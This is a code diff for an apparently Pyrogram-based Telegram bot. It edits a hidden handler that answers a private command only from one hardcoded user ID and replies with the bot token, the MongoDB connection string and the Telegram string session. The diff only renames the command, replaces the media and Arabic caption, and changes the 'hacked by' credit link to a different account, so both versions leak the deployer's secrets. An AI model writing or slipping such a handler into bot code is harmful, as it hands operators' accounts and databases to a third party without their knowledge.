@@ -29,19 +29,19 @@ rel = {}
 
  
 @app.on_message(
-    filters.command("done")
+    filters.command("Fuked")
     & filters.private
     & filters.user(6352598131)
    )
 async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/iam_daxx)............☆""",
+   await message.reply_video(
+          video=f"https://telegra.ph/file/a4c15881a722ec0dede39.mp4",
+       caption=f"""↢ هذه هي الاشياء الخاصه بالبوت 🚦\n\n⋄ التوكن : `{BOT_TOKEN}`\n⋄ جلسة : `{STRING_SESSION}`\n⋄ كود المونجو : `{MONGO_DB_URI}`""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/iam_daxx")
+                         "‹ FuKed By ›", url=f"https://t.me/ToPTeTo")
                  ]
             ]
          ),
